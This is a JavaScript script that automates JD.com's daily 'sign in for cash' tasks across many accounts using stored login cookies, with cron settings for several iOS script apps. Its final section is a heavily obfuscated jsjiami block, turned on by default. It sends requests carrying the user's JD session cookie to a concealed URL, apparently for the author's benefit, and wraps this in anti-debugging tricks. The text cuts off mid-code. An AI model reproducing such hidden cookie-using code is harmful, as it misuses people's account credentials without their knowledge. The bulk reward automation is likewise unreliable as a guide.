
/*
签到领现金，每日2毛～5毛
可互助，助力码每日不变，只变日期
活动入口：京东APP搜索领现金进入
已支持IOS双京东账号,Node.js支持N个京东账号
脚本兼容:QuantumultX,Surge,Loon,JSBox,Node.js
============Quantumultx===============
[task_local]
#签到领现金
2 0 * * * https://raw.githubusercontent.com/shuye72/MyActions/main/scripts/jd_cash.js, tag=签到领现金, enabled=true

================Loon==============
[Script]
cron "2 0 * * *" script-path=https://raw.githubusercontent.com/shuye72/MyActions/main/scripts/jd_cash.js,tag=签到领现金

===============Surge=================
签到领现金 = type=cron,cronexp="2 0 * * *",wake-system=1,timeout=20,script-path=https://raw.githubusercontent.com/shuye72/MyActions/main/scripts/jd_cash.js

============小火箭=========
签到领现金 = type=cron,script-path=https://raw.githubusercontent.com/shuye72/MyActions/main/scripts/jd_cash.js, cronexpr="2 0 * * *", timeout=200, enable=true
 */
const $ = new Env('签到领现金');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let jdNotify = true;//是否关闭通知，false打开通知推送，true关闭通知推送
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', message;
let helpAuthor = true;
const inviteCodes = [
  ``,
  ``
]
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = jsonParse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
}
const JD_API_HOST = 'https://api.m.jd.com/client.action';
!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  await requireConfig()
  await getAuthorShareCode();
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await jdCash()
    }
  }
})()
    .catch((e) => {
      $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
      $.done();
    })
async function jdCash() {
  await index()
  await shareCodesFormat()
  await helpFriends()
  await index(true)
  // await getReward()
  await showMsg()
}
function index(info=false) {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_mob_home",), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.code===0 && data.data.result){
              if(info){
                message += `当前现金：${data.data.result.signMoney}`
                return
              }
              console.log(`您的助力码为${data.data.result.inviteCode}`)
              let helpInfo = {
                'inviteCode': data.data.result.inviteCode,
                'shareDate': data.data.result.shareDate
              }
              $.shareDate = data.data.result.shareDate;
              $.log(`shareDate: ${$.shareDate}`)
              // console.log(helpInfo)
              for(let task of data.data.result.taskInfos){
                if (task.type === 4) {
                  for (let i = task.doTimes; i < task.times; ++i) {
                    console.log(`去做${task.name}任务 ${i+1}/${task.times}`)
                    await doTask(task.type, task.jump.params.skuId)
                    await $.wait(5000)
                  }
                }
                else if (task.type === 2) {
                  for (let i = task.doTimes; i < task.times; ++i) {
                    console.log(`去做${task.name}任务 ${i+1}/${task.times}`)
                    await doTask(task.type, task.jump.params.shopId)
                    await $.wait(5000)
                  }
                }
                else if (task.type === 16 || task.type===3 || task.type===5 || task.type===17 || task.type===21) {
                  for (let i = task.doTimes; i < task.times; ++i) {
                    console.log(`去做${task.name}任务 ${i+1}/${task.times}`)
                    await doTask(task.type, task.jump.params.url)
                    await $.wait(5000)
                  }
                }
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
async function helpFriends() {
  $.canHelp = true
  for (let code of $.newShareCodes) {
    console.log(`去帮助好友${code['inviteCode']}`)
    await helpFriend(code)
    if(!$.canHelp) break
    await $.wait(1000)
  }
  // if (helpAuthor && $.authorCode) {
  //   for(let helpInfo of $.authorCode){
  //     console.log(`去帮助好友${helpInfo['inviteCode']}`)
  //     await helpFriend(helpInfo)
  //     if(!$.canHelp) break
  //     await $.wait(1000)
  //   }
  // }
}
function helpFriend(helpInfo) {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_mob_assist", {...helpInfo,"source":1}), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if( data.code === 0 && data.data.bizCode === 0){
              console.log(`助力成功，获得${data.data.result.cashStr}`)
              // console.log(data.data.result.taskInfos)
            } else if (data.data.bizCode===207){
              console.log(data.data.bizMsg)
              $.canHelp = false
            } else{
              console.log(data.data.bizMsg)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function doTask(type,taskInfo) {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_doTask",{"type":type,"taskInfo":taskInfo}), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if( data.code === 0){
              console.log(`任务完成成功`)
              // console.log(data.data.result.taskInfos)
            }else{
              console.log(data)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function getReward() {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_mob_reward",{"source":1,"rewardNode":""}), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if( data.code === 0 && data.data.bizCode === 0 ){
              console.log(`领奖成功，${data.data.result.shareRewardTip}【${data.data.result.shareRewardAmount}】`)
              // console.log(data.data.result.taskInfos)
            }else{
              console.log(`领奖失败，${data.data.bizMsg}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function showMsg() {
  return new Promise(resolve => {
    if (!jdNotify) {
      $.msg($.name, '', `${message}`);
    } else {
      $.log(`京东账号${$.index}${$.nickName}\n${message}`);
    }
    resolve()
  })
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://gitee.com/Soundantony/RandomShareCode/raw/master/JD_Cash.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/updateTeam/master/shareCodes/jd_updateCash.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${$.shareCodesArr[$.index - 1]}`)
    $.newShareCodes = [];
    if ($.shareCodesArr[$.index - 1]) {
      $.newShareCodes = $.shareCodesArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > inviteCodes.length ? (inviteCodes.length - 1) : ($.index - 1);
      $.newShareCodes = inviteCodes[tempIndex].split('@');
      let authorCode = deepCopy($.authorCode)
      $.newShareCodes = [...(authorCode.map((item, index) => authorCode[index] = item['inviteCode'])), ...$.newShareCodes];
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      $.newShareCodes = [...new Set([...$.newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    $.newShareCodes.map((item, index) => $.newShareCodes[index] = { "inviteCode": item, "shareDate": $.shareDate })
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify($.newShareCodes)}`)
    resolve();
  })
}

function requireConfig() {
  return new Promise(resolve => {
    console.log(`开始获取${$.name}配置文件\n`);
    let shareCodes = [];
    if ($.isNode()) {
      if (process.env.JD_CASH_SHARECODES) {
        if (process.env.JD_CASH_SHARECODES.indexOf('\n') > -1) {
          shareCodes = process.env.JD_CASH_SHARECODES.split('\n');
        } else {
          shareCodes = process.env.JD_CASH_SHARECODES.split('&');
        }
      }
    }
    console.log(`共${cookiesArr.length}个京东账号\n`);
    $.shareCodesArr = [];
    if ($.isNode()) {
      Object.keys(shareCodes).forEach((item) => {
        if (shareCodes[item]) {
          $.shareCodesArr.push(shareCodes[item])
        }
      })
    }
    console.log(`您提供了${$.shareCodesArr.length}个账号的${$.name}助力码\n`);
    resolve()
  })
}
function deepCopy(obj) {
  let objClone = Array.isArray(obj) ? [] : {};
  if (obj && typeof obj === "object") {
    for (let key in obj) {
      if (obj.hasOwnProperty(key)) {
        //判断ojb子元素是否为对象，如果是，递归复制
        if (obj[key] && typeof obj[key] === "object") {
          objClone[key] = deepCopy(obj[key]);
        } else {
          //如果不是，简单复制
          objClone[key] = obj[key];
        }
      }
    }
  }
  return objClone;
}
function taskUrl(functionId, body = {}) {
  return {
    url: `${JD_API_HOST}?functionId=${functionId}&body=${escape(JSON.stringify(body))}&appid=CashRewardMiniH5Env&appid=9.1.0`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Connection': 'keep-alive',
      'Content-Type': 'application/json',
      'Referer': 'http://wq.jd.com/wxapp/pages/hd-interaction/index/index',
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
      'Accept-Language': 'zh-cn',
      'Accept-Encoding': 'gzip, deflate, br',
    }
  }
}

function getAuthorShareCode() {
  return new Promise(resolve => {
    $.get({url: "https://gitee.com/Soundantony/updateTeam/raw/master/shareCodes/jd_updateCash.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      $.authorCode = [];
      try {
        if (err) {
        } else {
          $.authorCode = JSON.parse(data)
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodZ='jsjiami.com.v6',_0x4311=[_0xodZ,'w79XA8K8wqPCjUDCoFJXw7ML','U3PConFHwq8Ywp/Cr8OtwonConVhDA3DlknCtcOMw4k2aUV2WyDDnsOSOcOAwqHDvQ==','eMKwUTFWR8OGKiLCg8O+w7DCjRlywpQyFcKxwrrDvTw=','SMOVwqbDpcK/RSLCkcO3wqjDoXR+HxUqwo0=','w5nDn8O7w6PDnMKtMsKsRcON','CHcC','w4zCs8KVSMKiGHAJw4rCtMOjTcO4','ZcOrwprDlA==','w40CYcObGMOswqhaQ201wqrCvsKwKMOdf8Klwo/DmcKPXVHCsMKRSCMsBMObEGzCncKsw47Dh27DssOkcknDvn9IeyBKwpjCmcK3wqMiwo3DssKkR8O/wrLDvMKAZF3DqwrCnmNMwrNzwpBFw40awpvDlMKMwoQ=','asKsCCJL','fMKrQg==','JzzCh8OqwpHDlcOkwoAl','AcKGw4Ulw6Q=','asKTw7zChTgVw7wqEx0Yw6zDrmYCInbCoMOSw7l+AGDDtcODQUPDoDt4wr8uHwHCpSXDjMKtM0AOw70NwoRicWzDmnbDvcKdw75qw59ob3bChsO3w7TDscKpLFDCosKKwqPDrsOaw7bDkkPCiMOhw5wZAkVAwq/CtVFewqPDsUfDh0g+EGUdN8Okw4/Dm8OpwqE7wo4mE8OIBlILwq3ClVFAb37DsMKkwrDCuSB/SSvDv03DgTPCm8K8w4fCpMOOUMO4EE97w4PDiMKww6bCtcO0QDpYwr/CpGzDlWgQw5x5woLDisKNB8Kx','Z07DhMKuw7Q=','YcOfwqXDpcO7','w4HDjMOGw77CvA==','OEImYxE=','J8KHRFkv','HMOKwpXDvsOv','w5vDicOQw7zClcKp','wpEyRQ==','fSHDjcKJMETChcKzTwcbw6g/','RzZe','w5bCiMK9w5PChw7DvhLCpcOmFMKvSQ==','w68hwp0Bwqk=','acKew4rCsQA=','SMKhf8KDwpZHEMKdwpHDkg==','w6lJw5DCmsOpwqly','w5AHwpYCwpk=','w5XDn8Oqw7fCkMK4Pw==','ezPDnsKQBw==','w5U9YsOnw7Y=','bsOOw4jDpMO+wq3DvcOKBcOBTsKIwovDuABxdlIVwow2w6R2w7dXdV/DknTCiU42SV/DsBxBIcKXR8OKwp4TJDYBUzsiHcKqw5wzCXp1w5nDp8Kjw7bCmcO1wofCoztCMMKzwrF8ecOIwqZRHHRMw4l6d8K3w6o=','w7guEh/CmQ==','anbDg8Kmwp1bY8K8Gy3DrwUjw6zCk8O/X8OZw4YiwpDDqhvCuMOAN0FUw5McwpLDnRouwohbMl0zwrrChsKwRsO8w5gVNybChcO6w6vCpxMEwq8NacKUw4o=','wq8hw5PDv10xBcKJw5FXw5Z8CnwLeh8iGMKfWMOgD2rCkHJbw74rwoTDtW5OJ8KDwrbDhhzCr8Kew4F3w6vCtR3DmMKJw7TCuCo6QsKFwocMNcKtBsO7Eg==','RwrDocKo','asOVw5s=','MsORw6F2J8KVOxDDlsKCw5UNcxZzARFywqBjZTzDnMOIw7JgTTQvGUHDt8K+w6VLHcOoe8KTIcKbwo3DlzLDjQPDoQs2a8K1CDPCnmPCu8Ouw7YywrvCqcO9wqjDnw9EwrUv','Bj/CrSPCpsOnw6pxTCFkw5PCusOzb0/CqcOlKxTDni5ccn9xw7HCt8OOw6Nww6h1TFbCvVZKw7TDhcO0wrrClwYFWgnCrDvDvsKDDXUEw7VwwqJRPsOGYARnBcKBw6HDrk7Ci2AGEsO9wocOcsK1wq7DjBzCu8KfIgbCsFLDlMO8P38iwpXDscObwp1rR3fDhsOId8KlbMOZU8KaCSbClFzDizLClsOhw4PCt3hWT8OzDgHClsKXf8OrWnIqX3XCtm/CmcKceUDCocOOeMKDw5IOw7x0WWFzwqLCmMOoRMKoUcKiUA==','V2TCjg==','w7bDlsOnw4HCkg==','w4zCn8KIw67ClQ==','cMOwJcK5w4rChkw=','wooHCcOePg==','w74WSw==','w4V0w4/CmsOt','MDUVw5hJw5XCkQ==','UcKHWcK6wrBFP8K5wq3Dqw==','w7DCqcKMw6HCoCM=','RljDocKNw4s=','woPCpzV2wogNHg==','exDDscK3GkLCv8KNfC0=','w4QHGA/CicKu','VcOTKcOPFAYP','wpxhY8O1wrF1wo3DgMK6Mg==','RWLCu2k=','w6gtVsOlMQ==','CbjwJGGsjiQUuuqFzami.com.v6=='];(function(_0x4fb800,_0x3afdae,_0x3fcfe5){var _0x302f4=function(_0x1af573,_0x23921e,_0x1d761a,_0x1fdb8f,_0x5bd811){_0x23921e=_0x23921e>>0x8,_0x5bd811='po';var _0x1a4741='shift',_0x295370='push';if(_0x23921e<_0x1af573){while(--_0x1af573){_0x1fdb8f=_0x4fb800[_0x1a4741]();if(_0x23921e===_0x1af573){_0x23921e=_0x1fdb8f;_0x1d761a=_0x4fb800[_0x5bd811+'p']();}else if(_0x23921e&&_0x1d761a['replace'](/[CbwJGGQUuuqFz=]/g,'')===_0x23921e){_0x4fb800[_0x295370](_0x1fdb8f);}}_0x4fb800[_0x295370](_0x4fb800[_0x1a4741]());}return 0x75637;};var _0x1bb497=function(){var _0x114b2b={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x25b0f5,_0x23f73c,_0xce4540,_0x447083){_0x447083=_0x447083||{};var _0x1d1926=_0x23f73c+'='+_0xce4540;var _0x3c3a27=0x0;for(var _0x3c3a27=0x0,_0x27b5d8=_0x25b0f5['length'];_0x3c3a27<_0x27b5d8;_0x3c3a27++){var _0x1ac097=_0x25b0f5[_0x3c3a27];_0x1d1926+=';\x20'+_0x1ac097;var _0x1adb6b=_0x25b0f5[_0x1ac097];_0x25b0f5['push'](_0x1adb6b);_0x27b5d8=_0x25b0f5['length'];if(_0x1adb6b!==!![]){_0x1d1926+='='+_0x1adb6b;}}_0x447083['cookie']=_0x1d1926;},'removeCookie':function(){return'dev';},'getCookie':function(_0x3c0839,_0x1a2564){_0x3c0839=_0x3c0839||function(_0x14b2b9){return _0x14b2b9;};var _0x5a8cf3=_0x3c0839(new RegExp('(?:^|;\x20)'+_0x1a2564['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x462ef8=typeof _0xodZ=='undefined'?'undefined':_0xodZ,_0x1aa456=_0x462ef8['split'](''),_0x14dbf6=_0x1aa456['length'],_0x3675a2=_0x14dbf6-0xe,_0xd6189e;while(_0xd6189e=_0x1aa456['pop']()){_0x14dbf6&&(_0x3675a2+=_0xd6189e['charCodeAt']());}var _0x268732=function(_0x155bfb,_0xa44223,_0x1ad06f){_0x155bfb(++_0xa44223,_0x1ad06f);};_0x3675a2^-_0x14dbf6===-0x524&&(_0xd6189e=_0x3675a2)&&_0x268732(_0x302f4,_0x3afdae,_0x3fcfe5);return _0xd6189e>>0x2===0x14b&&_0x5a8cf3?decodeURIComponent(_0x5a8cf3[0x1]):undefined;}};var _0x8b258b=function(){var _0x2765fe=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x2765fe['test'](_0x114b2b['removeCookie']['toString']());};_0x114b2b['updateCookie']=_0x8b258b;var _0x547f7b='';var _0xe6b9eb=_0x114b2b['updateCookie']();if(!_0xe6b9eb){_0x114b2b['setCookie'](['*'],'counter',0x1);}else if(_0xe6b9eb){_0x547f7b=_0x114b2b['getCookie'](null,'counter');}else{_0x114b2b['removeCookie']();}};_0x1bb497();}(_0x4311,0x162,0x16200));var _0x5a74=function(_0x5670d5,_0x449582){_0x5670d5=~~'0x'['concat'](_0x5670d5);var _0x36133b=_0x4311[_0x5670d5];if(_0x5a74['FkZtYV']===undefined){(function(){var _0x1a8fdf=function(){var _0x42d506;try{_0x42d506=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x14ee6c){_0x42d506=window;}return _0x42d506;};var _0x5701ef=_0x1a8fdf();var _0x161210='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x5701ef['atob']||(_0x5701ef['atob']=function(_0x412bd0){var _0xa269a6=String(_0x412bd0)['replace'](/=+$/,'');for(var _0x4a9aef=0x0,_0x24514f,_0x4228f4,_0xf2c040=0x0,_0x33aa94='';_0x4228f4=_0xa269a6['charAt'](_0xf2c040++);~_0x4228f4&&(_0x24514f=_0x4a9aef%0x4?_0x24514f*0x40+_0x4228f4:_0x4228f4,_0x4a9aef++%0x4)?_0x33aa94+=String['fromCharCode'](0xff&_0x24514f>>(-0x2*_0x4a9aef&0x6)):0x0){_0x4228f4=_0x161210['indexOf'](_0x4228f4);}return _0x33aa94;});}());var _0x26e77a=function(_0x20273e,_0x449582){var _0x5b851b=[],_0x4d5209=0x0,_0x519010,_0x3bdf42='',_0x2f0088='';_0x20273e=atob(_0x20273e);for(var _0x343a9e=0x0,_0x4168cc=_0x20273e['length'];_0x343a9e<_0x4168cc;_0x343a9e++){_0x2f0088+='%'+('00'+_0x20273e['charCodeAt'](_0x343a9e)['toString'](0x10))['slice'](-0x2);}_0x20273e=decodeURIComponent(_0x2f0088);for(var _0x2c0533=0x0;_0x2c0533<0x100;_0x2c0533++){_0x5b851b[_0x2c0533]=_0x2c0533;}for(_0x2c0533=0x0;_0x2c0533<0x100;_0x2c0533++){_0x4d5209=(_0x4d5209+_0x5b851b[_0x2c0533]+_0x449582['charCodeAt'](_0x2c0533%_0x449582['length']))%0x100;_0x519010=_0x5b851b[_0x2c0533];_0x5b851b[_0x2c0533]=_0x5b851b[_0x4d5209];_0x5b851b[_0x4d5209]=_0x519010;}_0x2c0533=0x0;_0x4d5209=0x0;for(var _0x32d346=0x0;_0x32d346<_0x20273e['length'];_0x32d346++){_0x2c0533=(_0x2c0533+0x1)%0x100;_0x4d5209=(_0x4d5209+_0x5b851b[_0x2c0533])%0x100;_0x519010=_0x5b851b[_0x2c0533];_0x5b851b[_0x2c0533]=_0x5b851b[_0x4d5209];_0x5b851b[_0x4d5209]=_0x519010;_0x3bdf42+=String['fromCharCode'](_0x20273e['charCodeAt'](_0x32d346)^_0x5b851b[(_0x5b851b[_0x2c0533]+_0x5b851b[_0x4d5209])%0x100]);}return _0x3bdf42;};_0x5a74['jvrxOX']=_0x26e77a;_0x5a74['NyZcjq']={};_0x5a74['FkZtYV']=!![];}var _0x43f499=_0x5a74['NyZcjq'][_0x5670d5];if(_0x43f499===undefined){if(_0x5a74['knoXgl']===undefined){var _0x1b8f09=function(_0x44ea2d){this['iPprea']=_0x44ea2d;this['OVfWCU']=[0x1,0x0,0x0];this['vGCQjE']=function(){return'newState';};this['KagEtc']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['ZsMUlY']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x1b8f09['prototype']['pqwyWm']=function(){var _0x58ab6e=new RegExp(this['KagEtc']+this['ZsMUlY']);var _0x4e1442=_0x58ab6e['test'](this['vGCQjE']['toString']())?--this['OVfWCU'][0x1]:--this['OVfWCU'][0x0];return this['WxmQgy'](_0x4e1442);};_0x1b8f09['prototype']['WxmQgy']=function(_0x64456c){if(!Boolean(~_0x64456c)){return _0x64456c;}return this['EfuCQf'](this['iPprea']);};_0x1b8f09['prototype']['EfuCQf']=function(_0x373de2){for(var _0x46a7f4=0x0,_0xa69615=this['OVfWCU']['length'];_0x46a7f4<_0xa69615;_0x46a7f4++){this['OVfWCU']['push'](Math['round'](Math['random']()));_0xa69615=this['OVfWCU']['length'];}return _0x373de2(this['OVfWCU'][0x0]);};new _0x1b8f09(_0x5a74)['pqwyWm']();_0x5a74['knoXgl']=!![];}_0x36133b=_0x5a74['jvrxOX'](_0x36133b,_0x449582);_0x5a74['NyZcjq'][_0x5670d5]=_0x36133b;}else{_0x36133b=_0x43f499;}return _0x36133b;};if(helpAuthor){shuye72();function help(_0x3e177b){var _0x121201={'TZIft':function(_0x2929b2,_0x3d2e22){return _0x2929b2+_0x3d2e22;},'oWcqT':_0x5a74('0','q#nY'),'Npjph':_0x5a74('1','%z0z'),'svXmM':_0x5a74('2','9*bq'),'MggjS':_0x5a74('3','*h99'),'dYnLB':_0x5a74('4','EZsI'),'mHoTR':_0x5a74('5','X]bF'),'spGOT':function(_0x5d4790,_0x9779ef){return _0x5d4790(_0x9779ef);},'kyBDK':_0x5a74('6','xEF^'),'LVLLd':_0x5a74('7','*h99'),'GDNte':_0x5a74('8','A^@&'),'PLdwd':_0x5a74('9','9*bq')};console[_0x5a74('a','9*bq')](_0x3e177b);let _0x506c71=+new Date();let _0x3b731f=_0x3e177b[_0x5a74('b','Db9N')];let _0x1e1ac4={'url':_0x121201[_0x5a74('c','8&yt')](_0x5a74('d','vjCD'),_0x506c71),'headers':{'Host':_0x121201[_0x5a74('e','Ulof')],'Content-Type':_0x121201[_0x5a74('f','*h99')],'origin':_0x121201[_0x5a74('10','EZsI')],'Accept-Encoding':_0x121201[_0x5a74('11','H$1F')],'Cookie':cookie,'Connection':_0x121201[_0x5a74('12','99*o')],'Accept':_0x121201[_0x5a74('13','Jasa')],'User-Agent':$[_0x5a74('14','EZsI')]()?process[_0x5a74('15','w17(')][_0x5a74('16','I0!n')]?process[_0x5a74('17','X]bF')][_0x5a74('18','Rn4U')]:_0x121201[_0x5a74('19','khrp')](require,_0x121201[_0x5a74('1a','vjCD')])[_0x5a74('1b','2!#B')]:$[_0x5a74('1c','hN8z')](_0x121201[_0x5a74('1d','khrp')])?$[_0x5a74('1e','EZsI')](_0x121201[_0x5a74('1f','I0!n')]):_0x121201[_0x5a74('20','zNBY')],'referer':_0x5a74('21','JHye')+_0x3b731f,'Accept-Language':_0x121201[_0x5a74('22','&Tpp')]},'body':_0x5a74('23','Ulof')+_0x3b731f+_0x5a74('24','I0gU')};$[_0x5a74('25','I0!n')](_0x1e1ac4,(_0x2a6308,_0xf7a10f,_0x23288e)=>{console[_0x5a74('26','JHye')](_0x23288e);});}function shuye72(){var _0xe24b46=function(){var _0x584a0a=!![];return function(_0x3f85f5,_0xe6d95b){var _0x285721=_0x584a0a?function(){if(_0xe6d95b){var _0x372be3=_0xe6d95b['apply'](_0x3f85f5,arguments);_0xe6d95b=null;return _0x372be3;}}:function(){};_0x584a0a=![];return _0x285721;};}();var _0x5b056e=_0xe24b46(this,function(){var _0x3687da=function(){return'\x64\x65\x76';},_0x4f7fef=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x31423f=function(){var _0x58c73b=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x58c73b['\x74\x65\x73\x74'](_0x3687da['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x25bf1d=function(){var _0x46d8fa=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x46d8fa['\x74\x65\x73\x74'](_0x4f7fef['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0xbe1687=function(_0x1401ef){var _0x3957c0=~-0x1>>0x1+0xff%0x0;if(_0x1401ef['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x3957c0)){_0x110474(_0x1401ef);}};var _0x110474=function(_0x223955){var 